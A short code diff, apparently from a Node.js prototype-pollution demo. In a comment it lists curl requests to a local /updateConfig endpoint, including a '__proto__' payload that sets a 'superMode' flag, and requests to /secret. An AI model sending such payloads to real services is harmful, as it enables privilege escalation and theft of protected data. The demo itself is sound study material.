@@ -66,5 +66,7 @@ console.log(`Running on http://${HOST}:${PORT}`);
 /*
 curl --header 'Content-type: application/json' -d '{"foo":2.0}' localhost:8080/updateConfig
 curl --header 'Content-type: application/json' localhost:8080/secret
+curl --header 'Content-type: application/json' -d '{"superMode":true}' localhost:8080/updateConfig
 curl --header 'Content-type: application/json' -d '{"foo":2.0, "__proto__": {"superMode": 1}}' localhost:8080/updateConfig
+curl --header 'Content-type: application/json' localhost:8080/secret
 */
